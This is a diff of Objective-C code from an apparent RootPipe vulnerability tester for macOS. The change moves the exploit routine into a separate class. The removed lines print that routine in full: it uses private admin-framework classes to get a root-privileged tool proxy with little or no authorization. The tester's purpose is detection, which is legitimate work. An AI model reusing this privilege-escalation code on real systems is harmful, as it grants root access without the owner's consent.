@@ -25,10 +25,6 @@
 NSString * const RootPipeTestStarted = @"RootPipeTestStarted";
 NSString * const RootPipeTestFinished = @"RootPipeTestFinished";
 
-static Class Authenticator = nil;
-static Class WriteConfigClient = nil;
-static Class ToolLiaison = nil;
-
 static NSString * const FILE_PATH_FMT = @"/private/tmp/rootpipe_tester_%@.txt";
 NSString *FILE_PATH = @"/private/tmp/rootpipe_tester.txt"; // value will get replaced in +initialize
 static NSMutableArray *usedTempFiles = nil;
@@ -61,10 +57,6 @@ static NSMutableArray *usedTempFiles = nil;
 
 + (void)initialize {
 	if (self == [RootPipeDelegate class]) {
-		Authenticator = NSClassFromString(@"Authenticator");
-		WriteConfigClient = NSClassFromString(@"WriteConfigClient");
-		ToolLiaison = NSClassFromString(@"ToolLiaison");
-		
 		// Initialize Temp-File Store
 		if (!usedTempFiles) usedTempFiles = [[NSMutableArray alloc] initWithCapacity:2];
 	}
@@ -151,56 +143,9 @@ static NSMutableArray *usedTempFiles = nil;
 }
 
 
-
-- (RootPipeAPIVersion)apiVersion {
-	if (NSClassFromString(@"WriteConfigClient")) return RootPipeNewApi; //10.9 or higher
-	if (NSClassFromString(@"ToolLiaison")) return RootPipeOldApi; // 10.8 or lower
-	
-	return 0;
-}
-
 // Tells you if the momentary test file exists on the file system
 - (BOOL)testFileExists {
 	return [[NSFileManager defaultManager] fileExistsAtPath:FILE_PATH isDirectory:nil];
-}
-
-- (id)getTool:(BOOL)useAuth {
-	// This is where the magic happens
-	id tool = nil;
-	
-	@try {
-		SFAuthorization *auth = [SFAuthorization authorization];
-		
-		switch ([self apiVersion]) {
-			case RootPipeNewApi: {
-				id sharedClient = [WriteConfigClient sharedClient];
-				[sharedClient authenticateUsingAuthorizationSync:(useAuth ? auth : nil)];
-				tool = [sharedClient remoteProxy];
-				break;
-			}
-			case RootPipeOldApi: {
-				id authenticator = [Authenticator sharedAuthenticator];
-				[authenticator authenticateUsingAuthorizationSync:(useAuth ? auth : nil)];
-				id sharedLiaison = [ToolLiaison sharedToolLiaison];
-				tool = [sharedLiaison tool];			
-				break;
-			}
-			default:
-				break;
-		}
-		
-	}
-	@catch (NSException *e) {
-		fprintf(stderr, "An %s was raised while trying to get tool: %s\n", [[e name] UTF8String], [[e reason] UTF8String]);
-	}
-	
-	return tool;
-}
-
-- (id)getTool {
-	id tool = [self getTool:NO];
-	if (tool == nil) tool = [self getTool:YES];
-	return tool;
 }
 
 - (BOOL)runTestWithAuthorization:(BOOL)useAuth {
@@ -218,7 +163,7 @@ static NSMutableArray *usedTempFiles = nil;
 	
 	// Get Tool
 	printf("Trying to get tool\u2026\n");
-	id tool = [self getTool:useAuth];
+	id tool = [RootPipeExploit getTool:useAuth];
 	if ([tool respondsToSelector:@selector(description)] || tool == nil) {
 		printf("Tool is: %s\n", [[tool description] UTF8String]);
 	} else {
@@ -320,7 +265,7 @@ static NSMutableArray *usedTempFiles = nil;
 		   [(NSString *)[systemVersion objectForKey:@"ProductVersion"] UTF8String], 
 		   [(NSString *)[systemVersion objectForKey:@"ProductBuildVersion"] UTF8String]
 		   );
-	printf("Appropriate API version for your system: %s\n", ([self apiVersion] == RootPipeNewApi ? "New API" : "Old API"));
+	printf("Appropriate API version for your system: %s\n", ([RootPipeExploit apiVersion] == RootPipeNewApi ? "New API" : "Old API"));
 	printf("\n");
 	
 	// Run tests
@@ -445,7 +390,7 @@ static NSMutableArray *usedTempFiles = nil;
 		if ([fm fileExistsAtPath:file]) {
 			// Delete our testing file
 			deleteSuccess = [[NSFileManager defaultManager] removeFileAtPath:FILE_PATH handler:nil];
-			if (!deleteSuccess && (tool = [self getTool]) && isLeopardOrHigher) {
+			if (!deleteSuccess && (tool = [RootPipeExploit getTool]) && isLeopardOrHigher) {
 				// Let's try and use RootPipe to delete the file…
 				deleteSuccess = [tool removeFileAtPath:FILE_PATH];
 				if (!deleteSuccess) { NSLog(@"Clean up failed even using RootPipe."); }
